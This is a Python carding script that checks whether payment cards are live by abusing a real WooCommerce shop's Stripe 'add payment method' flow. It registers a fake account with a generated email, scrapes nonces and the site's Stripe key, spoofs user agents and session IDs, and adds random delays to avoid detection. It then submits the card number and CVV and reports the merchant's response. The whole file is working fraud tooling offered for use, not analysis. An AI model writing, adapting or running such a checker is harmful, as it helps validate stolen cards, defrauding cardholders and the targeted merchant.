import requests
import re,time
import datetime
import random
from user_agent import generate_user_agent
import faker

#@niviin
def st_1_auth(card):
    def ssid():
        abc = 'qwertyuiopasdfghjklzxcvbnm1234567890'
        g1 = ''.join(random.choices(abc,k=8))
        g2 = ''.join(random.choices(abc,k=4))
        g3 = ''.join(random.choices(abc,k=4))
        g4 = ''.join(random.choices(abc,k=4))
        g5 = ''.join(random.choices(abc,k=18))
        return f"{g1}-{g2}-{g3}-{g4}-{g5}"
    def cliend_somthing():
        abc = 'qwertyuiopasdfghjklzxcvbnm1234567890'
        g1 = ''.join(random.choices(abc,k=8))
        g2 = ''.join(random.choices(abc,k=4))
        g3 = ''.join(random.choices(abc,k=4))
        g4 = ''.join(random.choices(abc,k=4))
        g5 = ''.join(random.choices(abc,k=12))
        return f"{g1}-{g2}-{g3}-{g4}-{g5}"
    
    user_ag = generate_user_agent()
    session = requests.session()
    guid = ssid()
    muid = ssid()
    sid = ssid()
    client_element = cliend_somthing()
    
    try:
        card_parts = card.strip().split("|")
        card_num = card_parts[0]
        card_mm = card_parts[1]
        card_yy = card_parts[2]
        card_cvv = card_parts[3]
    except IndexError:
        return "| Invalid Card Format"

    if int(card_yy) > 2000: card_yy = str(int(card_yy)-2000)
    if int(card_yy) < 24: return "| Invalid Date"
    
    headers = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',}
    
    
    response = session.get('https://uchangellc.com/my-account/add-payment-method/',  headers=headers)
    try:
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"',response.text)[0]
        pk = re.findall('"key":"(.*?)"',response.text)[0]
    except IndexError:
        return "| Failed to capture initial nonces"

    time.sleep(random.uniform(1.0, 3.0))
    
    headers = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://uchangellc.com',
        'Connection': 'keep-alive',
        'Referer': 'https://uchangellc.com/my-account/add-payment-method/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',}
    
    data = {
        'email': faker.Faker().email(domain="gmail.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://uchangellc.com/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': f' {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',}
    
    
    response = session.post('https://uchangellc.com/my-account/add-payment-method/', headers=headers, data=data)
    try:
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"',response.text)[0]
    except IndexError:
        return "| Failed to capture Ajax Nonce"

    time.sleep(random.uniform(1.0, 3.0))
    
    headers_stripe = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',}
    
    data_stripe = f'type=card&card[number]={card_num}&card[cvc]={card_cvv}&card[exp_year]={card_yy}&card[exp_month]={card_mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=11081&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fc1fbe29896%3B+stripe-js-v3%2Fc1fbe29896%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fuchangellc.com&time_on_page=533472&client_attribution_metadata[client_session_id]={client_element}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={client_element}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk}&_stripe_version=2024-06-20'

    
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
    try:
        pm = response.json()['id']
    except:
        try: return f"| Stripe Error: {response.json()['error']['message']}"
        except: return "| Unknown Stripe Error"

    time.sleep(random.uniform(1.0, 3.0))
    
    headers_confirm = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://uchangellc.com',
        'Connection': 'keep-alive',
        'Referer': 'https://uchangellc.com/my-account/add-payment-method/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',}
    
    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',}
    
    data_confirm = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,} 
    
    
    response = session.post('https://uchangellc.com/', params=params, headers=headers_confirm, data=data_confirm)
    try:
        res_json = response.json()
        status = res_json.get("success", False)
        msg = res_json.get("data", {}).get("message")
        if not msg:
            msg = res_json.get("data", {}).get("error", {}).get("message", "No message")
        return f"| Status : {status} | Message : {msg}"
    except:
        return f"| Error parsing final response: {response.text[:100]}"


card_input = input("card|mm|yy|cvv: ")
if card_input.strip():
    print(f"\nProcessing...  :{card_input.strip()}")
    result = st_1_auth(card_input.strip())
    print(result)
    print("-" * 50)
else:
    print("put card")
